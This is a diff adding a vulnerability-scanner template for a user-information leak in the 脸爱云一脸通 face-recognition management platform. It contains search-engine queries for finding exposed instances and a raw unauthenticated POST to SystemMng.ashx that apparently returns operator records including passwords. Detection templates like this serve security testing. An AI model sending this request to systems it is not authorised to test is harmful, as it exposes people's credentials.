@@ -1,0 +1,36 @@
+id: lianaiyun-SystemMng-leak
+
+info:
+  name: 脸爱云一脸通智慧平台SystemMng信息泄露漏洞
+  author: Simple
+  severity: medium
+  description: |
+    脸爱云一脸通智慧管理平台 SystemMng 管理用户信息泄露，攻击者可利用此漏洞收集敏感信息，从而为下一步攻击做准备。
+  reference:
+    - https://github.com/JJThome
+  metadata:
+    fofa-query: body="View/UserReserved/UserReservedTest.aspx"
+    quake-query: body:"View/UserReserved/UserReservedTest.aspx"
+    hunter-query: web.body="View/UserReserved/UserReservedTest.aspx"
+
+http:
+  - raw:
+      - |
+        POST /SystemMng.ashx HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36
+        Accept: application/json, text/javascript, */*; q=0.01
+        X-Requested-With: XMLHttpRequest
+        Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+        Accept-Encoding: gzip, deflate
+        Accept-Language: zh-CN,zh;q=0.9
+        Connection: close
+
+        username=admin&funcName=SelOperators
+
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code == 200
+          - contains(body,"password")
+        condition: and
